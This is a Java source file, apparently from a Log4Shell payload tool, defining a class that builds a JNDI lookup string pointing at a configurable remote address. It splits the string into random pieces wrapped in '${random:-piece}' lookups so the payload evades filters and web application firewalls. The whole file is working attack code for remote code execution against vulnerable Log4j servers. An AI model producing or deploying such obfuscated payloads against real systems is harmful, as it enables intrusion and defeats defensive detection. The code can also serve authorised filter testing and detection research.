package org.yuudai;

import com.google.common.base.CharMatcher;
import org.jetbrains.annotations.NotNull;

import java.security.SecureRandom;
import java.util.Random;

public class SearchStringObfuscator extends Obfuscator {
    static final String parts = "${*:-+}";
    @Override
    public @NotNull String GenerateTargetString() {
        return jndi + ObfuscatorUtils.SelectRandom(proto) + "://" + address;
    }

    protected @NotNull String GenerateObfuscatedString() {
        return first + SearchStringObfuscation(GenerateTargetString()) + "}";
    }

    private @NotNull String SearchStringObfuscation(@NotNull String target) {
        StringBuilder builder = new StringBuilder();
        char[] c = target.toCharArray();
        int i = 0;
        do {
            Random rd = new SecureRandom();
            int len = 1;
            if ((c.length - i) > 1){
                len = rd.nextInt(1, c.length - i);
            }
            i += len;
            String substring = target.substring(i - len, i);
            String tmp = CharMatcher.is('+').replaceFrom(parts, substring);
            builder.append(CharMatcher.is('*').replaceFrom(tmp, ObfuscatorUtils.GenerateRandomString(10)));
        } while ((c.length - i) > 0);
        return builder.toString();
    }
}
